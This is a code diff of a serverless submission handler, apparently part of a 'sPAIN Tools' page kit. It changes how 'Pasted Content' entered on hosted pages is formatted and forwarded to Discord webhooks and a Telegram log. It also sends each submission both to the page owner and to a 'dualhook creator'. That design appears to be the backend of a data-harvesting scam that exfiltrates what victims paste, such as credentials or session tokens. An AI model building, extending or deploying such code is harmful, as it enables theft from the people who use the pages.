@@ -23,16 +23,49 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-async function sendToDiscord(webhookUrl, embed) {
+async function sendToDiscord(webhookUrl, pageName, slotLabel, slotValue, now) {
   if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
   try {
     await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        username: 'sPAIN Tools',
-        avatar_url: 'https://spain-tools.vercel.app/favicon.ico',
-        embeds: [embed]
+        content: '@everyone',
+        embeds: [
+          {
+            title: '🚨 New Submission Received',
+            description: ':fire: `NEW PAGE ENTRY` :fire:\n\n[Dashboard 📊](https://example.com) | [Logs 📁](https://example.com) | [Discord Server 💬](https://example.com)',
+            color: 5793266,
+            fields: [
+              {
+                name: '📄 Page',
+                value: `\`${pageName}\``,
+                inline: true
+              },
+              {
+                name: '🎯 Slot',
+                value: `\`${slotLabel}\``,
+                inline: true
+              },
+              {
+                name: '📥 Pasted Content',
+                value: `\`\`\`${slotValue}\`\`\``
+              },
+              {
+                name: '📅 Date Submitted',
+                value: `\`${now}\``,
+                inline: false
+              }
+            ],
+            footer: {
+              text: 'Submission Logger • Automated System'
+            },
+            thumbnail: {
+              url: 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
+            }
+          }
+        ],
+        attachments: []
       })
     });
   } catch (_) {}
@@ -64,24 +97,13 @@ export default async function handler(req, res) {
   }
   if (!record) return res.status(404).json({ error: 'Page not found' });
 
-  // ── Discord embed ─────────────────────────────────────────────────────────
-  const fields = Object.entries(slots).map(([key, value]) => ({
-    name:   `Slot ${key.replace('slot', '')}`,
-    value:  value || '*(empty)*',
-    inline: true
-  }));
-
   const now = new Date().toISOString();
-  const embed = {
-    title:     `📥 New Submission — ${record.displayName}`,
-    color:     0xc026d3,
-    fields,
-    footer:    { text: `sPAIN Tools • ${slug} • ${now}` },
-    timestamp: now
-  };
+  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
+  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
+  const slotValue = slotEntry ? slotEntry[1] : '(empty)';
 
   // ── Send to webhook2 (page owner) ─────────────────────────────────────────
-  await sendToDiscord(record.webhook, embed);
+  await sendToDiscord(record.webhook, record.displayName, slotLabel, slotValue, now);
 
   // ── Send to webhook1 (dualhook creator) if applicable ────────────────────
   let webhook1 = 'N/A';
@@ -91,17 +113,13 @@ export default async function handler(req, res) {
       if (parentRecord && parentRecord.webhook) {
         webhook1 = parentRecord.webhook;
         if (parentRecord.webhook !== record.webhook) {
-          await sendToDiscord(parentRecord.webhook, embed);
+          await sendToDiscord(parentRecord.webhook, record.displayName, slotLabel, slotValue, now);
         }
       }
     } catch (_) {}
   }
 
   // ── Telegram log ──────────────────────────────────────────────────────────
-  const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
-  const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
-  const slotValue = slotEntry ? slotEntry[1] : '(empty)';
-
   const tgMsg = [
     `🚨 <b>NEW SUBMISSION RECEIVED</b> 🚨`,
     `------------------------------------------`,
